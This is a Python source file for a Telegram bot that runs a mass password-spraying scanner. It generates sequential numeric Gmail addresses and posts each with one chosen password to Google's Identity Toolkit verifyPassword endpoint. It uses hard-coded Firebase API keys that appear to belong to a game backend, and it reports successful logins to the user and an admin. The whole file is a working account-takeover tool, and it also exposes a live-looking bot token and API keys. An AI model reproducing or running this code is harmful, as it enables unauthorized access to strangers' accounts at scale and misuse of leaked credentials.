import telebot
import asyncio
import aiohttp
from telebot import types
from threading import Thread
from flask import Flask
import os
import time

# Render-nu vendi Flask
app = Flask('')
@app.route('/')
def home(): return "⚡100k Scanner is Online!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# --- CONFIG ---
TOKEN = "8574711169:AAEpY7ydcHy1nYoZnNVLi4w63HHnxNqamhM"
bot = telebot.TeleBot(TOKEN)
ADMIN_ID = 7212602902
APPROVED_USERS = {7212602902}

API_KEYS = {
    "CPM1": "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM",
    "CPM2": "AIzaSyCqLQh3vlumESlbAsZSZRQChp7eW43kzhk"
}

# --- ASYNC SCANNER LOGIC ---
async def check_acc_async(session, email, pwd, key):
    url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={key}"
    payload = {"email": email, "password": pwd, "returnSecureToken": True}
    try:
        async with session.post(url, json=payload, timeout=5) as response:
            if response.status == 200:
                return email
    except:
        return None
    return None

async def run_scanner(start, end, password, key, chat_id):
    # Oreyasam 500 requests vare handle cheyyaan ulla setup
    connector = aiohttp.TCPConnector(limit=500)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for num in range(start, end + 1):
            email = f"{num}@gmail.com"
            tasks.append(check_acc_async(session, email, password, key))
        
        # Gathering all results
        results = await asyncio.gather(*tasks)
        hits = [res for res in results if res]
        
        if hits:
            hit_text = "✅ **HITS FOUND:**\n" + "\n".join(hits)
            bot.send_message(chat_id, hit_text)
            bot.send_message(ADMIN_ID, f"🔔 **LOG:** {len(hits)} hits in range {start}-{end}")
        else:
            bot.send_message(chat_id, f"❌ Range {start}-{end} completed. No hits.")

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id not in APPROVED_USERS: return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add('🚀 Start 100K Scanner')
    bot.send_message(message.chat.id, "🔥 **FLAME ASYNC V2**\nSelect option:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == '🚀 Start 100K Scanner')
def ask_range(message):
    msg = bot.send_message(message.chat.id, "🔢 **Format:** `Start:End:Pass:Server` \n(Ex: `9000000000:9001000000:pass123:CPM2`)")
    bot.register_next_step_handler(msg, start_async_process)

def start_async_process(message):
    try:
        parts = message.text.split(':')
        start_n, end_n, pwd, server = int(parts[0]), int(parts[1]), parts[2], parts[3].upper()
        key = API_KEYS.get(server)

        bot.send_message(message.chat.id, f"⚡ **Scanning 1 Lakh+ Range...**\nThis may take a few minutes.")
        
        # Async loop-ine separate thread-il run cheyyunnu
        new_loop = asyncio.new_event_loop()
        t = Thread(target=lambda: new_loop.run_until_complete(run_scanner(start_n, end_n, pwd, key, message.chat.id)))
        t.start()

    except:
        bot.send_message(message.chat.id, "⚠️ Invalid Format!")

if __name__ == "__main__":
    Thread(target=run_flask).start()
    bot.infinity_polling()
